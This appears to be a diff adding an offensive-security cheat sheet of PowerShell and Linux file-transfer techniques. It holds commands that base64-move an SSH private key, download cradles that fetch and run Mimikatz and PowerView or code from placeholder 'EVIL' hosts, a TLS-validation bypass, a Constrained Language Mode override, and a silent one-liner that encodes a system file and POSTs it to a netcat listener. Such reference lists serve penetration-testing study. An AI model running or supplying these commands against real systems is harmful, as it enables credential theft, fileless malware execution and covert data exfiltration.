@@ -1,0 +1,89 @@
+### Transfer Base64 code
+
+$ cat id_rsa |base64 -w 0;echo     #ENCODE in LINUX
+> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRvMkttVzJzVENkbm92Y3BiK3Q3S2lPc9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))  #DECODE IN WINDOWS
+--------------------------------------------------
+### Powershell
+
+#Error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
+> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+After error about TLS trust:
+> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+
+# Below Downloads data from a resource to a local file.
+> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')  
+
+# Below Downloads data from a resource and returns a Byte array without blocking the calling thread 
+> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
+
+# PowerShell DownloadString - Fileless Method
+> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+or with pipeline
+> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+
+# PowerShell Invoke-WebRequest or instead fullname ALIASES: iwr, curl, and wget
+> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+
+############################################### 
+#########  DOWNLOAD CRADLES TO CHECK OUT! #####
+
+# normal download cradle
+IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
+
+# PowerShell 3.0+
+IEX (iwr 'http://EVIL/evil.ps1')
+
+# hidden IE com object
+$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
+
+# Msxml2.XMLHTTP COM object
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
+
+# WinHttp COM object (not proxy aware!)
+$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
+
+# using bitstransfer- touches disk!
+Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r
+
+# DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)
+#   code to execute needs to be a base64 encoded string stored in a TXT record
+IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))
+
+# from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d
+<#
+<?xml version="1.0"?>
+<command>
+   <a>
+      <execute>Get-Process</execute>
+   </a>
+  </command>
+#>
+$a = New-Object System.Xml.XmlDocument
+$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
+$a.command.a.execute | iex
+
+#########  DOWNLOAD CRADLES TO CHECK OUT! #####
+###############################################
+
+
+In Constrained Language Mode, certain .NET and COM APIs, particularly those that are considered high-risk, are restricted.
+$ExecutionContext.SessionState.LanguageMode   
+$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'     #to change
+------------------------------------------
+Step 1   # nc -lvnp 80
+Step 1   To test connection> Test-NetConnection -ComputerName 10.90.2.44 -Port 80
+Step 2   > certutil -encode C:\Windows\System32\drivers\etc\hosts C:\Users\2Pirate\hosts.b64; $b64 = Get-Content -Path 'C:\2Pirate\hosts.b64' -Raw; Invoke-WebRequest -Uri http://10.10.10.124:80/ -Method POST -Body $b64 -ContentType "text/plain" -ErrorAction SilentlyContinue
+Step 2   Alternative   #### Oneliner to Base64 encode file with certutil into TEMP file certcheck.b64 and send to Netcat listener, 2 sec then command stops and dont wait for response also NO OUTPUT.  
+> $TempFile = "$env:TEMP\certcheck.b64"; certutil -encode C:\Windows\System32\drivers\etc\hosts $TempFile | Out-Null; $b64 = Get-Content -Path $TempFile -Raw; Remove-Item -Path $TempFile -Force; try { Invoke-WebRequest -Uri http://10.10.10.124:80/ -Method POST -Body $b64 -ContentType "text/plain" -ErrorAction Stop -TimeoutSec 2 | Out-Null } catch { $null }
+
+
+
+
+
+
+
+
+
+
+
